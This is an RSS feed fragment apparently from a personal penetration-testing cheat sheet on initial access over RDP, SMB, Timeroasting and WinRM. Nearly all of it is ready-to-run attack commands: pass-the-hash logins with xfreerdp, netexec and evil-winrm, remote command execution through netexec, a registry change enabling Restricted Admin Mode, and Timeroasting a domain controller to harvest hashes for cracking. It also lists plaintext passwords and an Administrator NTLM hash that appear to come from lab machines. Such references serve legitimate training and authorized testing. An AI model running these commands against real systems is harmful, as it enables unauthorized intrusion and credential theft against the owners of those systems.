    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/04.-initial-access/rdp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/04.-initial-access/rdp/</guid>
      <description>&lt;h1 id=&#34;connect&#34;&gt;Connect&lt;a class=&#34;anchor&#34; href=&#34;#connect&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xfreerdp3 /u:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; /p:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; /v:$target:3389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rdesktop $target -d HTB -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;connect-and-mount-local-directory&#34;&gt;Connect and mount local directory&lt;a class=&#34;anchor&#34; href=&#34;#connect-and-mount-local-directory&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Mount a directory from linux machine when connect to rdp. Connect with &lt;code&gt;\\tsclient\&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xfreerdp /u:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; /p:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; /v:$target /drive:linux,/home/kali/payloads/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rdesktop $target -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -r disk:linux&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/kali/payloads&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;pass-the-hash&#34;&gt;Pass the hash&lt;a class=&#34;anchor&#34; href=&#34;#pass-the-hash&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xfreerdp3  /v:$target /u:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; /pth:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$hash&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If presented with &lt;code&gt;account restrictions preventing this user from logging in&lt;/code&gt;, enable &lt;code&gt;Restricted Admin Mode&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Note: UAC allows only built-in local admin account (RID-500, &amp;ldquo;Administrator&amp;rdquo;) to perform remote administration tasks. Set it to 1 if you need it.&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/04.-initial-access/smb/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/04.-initial-access/smb/</guid>
      <description>&lt;h1 id=&#34;access&#34;&gt;Access&lt;a class=&#34;anchor&#34; href=&#34;#access&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;with-credentials&#34;&gt;With credentials&lt;a class=&#34;anchor&#34; href=&#34;#with-credentials&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;smbclient -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;%&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -L //$target/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netexec smb $target --shares -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pass-the-hash&#34;&gt;Pass the hash&lt;a class=&#34;anchor&#34; href=&#34;#pass-the-hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netexec smb $target -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -d . -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$hash&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;rce&#34;&gt;RCE&lt;a class=&#34;anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netexec smb $target --shares -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -x whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/04.-initial-access/timeroasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/04.-initial-access/timeroasting/</guid>
      <description>&lt;h1 id=&#34;timeroast&#34;&gt;Timeroast&lt;a class=&#34;anchor&#34; href=&#34;#timeroast&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/TimeRoasting.html&#34;&gt;More Info&lt;/a&gt;&lt;/p&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Essentially, what this does is sending some weird SNTP packets that somehow the &lt;strong&gt;Domain Controller&lt;/strong&gt; response with a packet (MAC) that is encrypted by the computer account&amp;rsquo;s NTLM hash.&#xA;So we can request every computer accounts&amp;rsquo; hash and crack them, as a unauthenticated attacker&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;We can exploit this by simply run a &lt;code&gt;netexec&lt;/code&gt; module on the DC.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb 10.10.11.75 -M timeroast&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then simply crack the hash&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/04.-initial-access/winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/04.-initial-access/winrm/</guid>
      <description>&lt;h1 id=&#34;access&#34;&gt;Access&lt;a class=&#34;anchor&#34; href=&#34;#access&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm -u emily.oscars -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Q!3@Lp#M6b*7t*Vt&amp;#39;&lt;/span&gt; -i $target&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# NTLM hash&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm -u Administrator -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2b87e7c93a3e8a0ea4a581937016f341&amp;#39;&lt;/span&gt; -i $target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;with-a-cert-file&#34;&gt;With a cert file&lt;a class=&#34;anchor&#34; href=&#34;#with-a-cert-file&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Extract cert and key from pfx file&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl pkcs12 -in yourfile.pfx -clcerts -nokeys -out cert.pem -password pass:yourpassword&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl pkcs12 -in yourfile.pfx -nocerts -out key.pem -nodes -password pass:yourpassword&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Get a shell with cert&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm -S -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dev&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;supremelegacy&amp;#39;&lt;/span&gt; -c ./cert.pem -k ./key.pem -i $target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;pass-the-hash&#34;&gt;Pass the hash&lt;a class=&#34;anchor&#34; href=&#34;#pass-the-hash&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm&#34;&gt;Why the hell does this work?&lt;/a&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;evil-winrm -i $target -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$hash&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
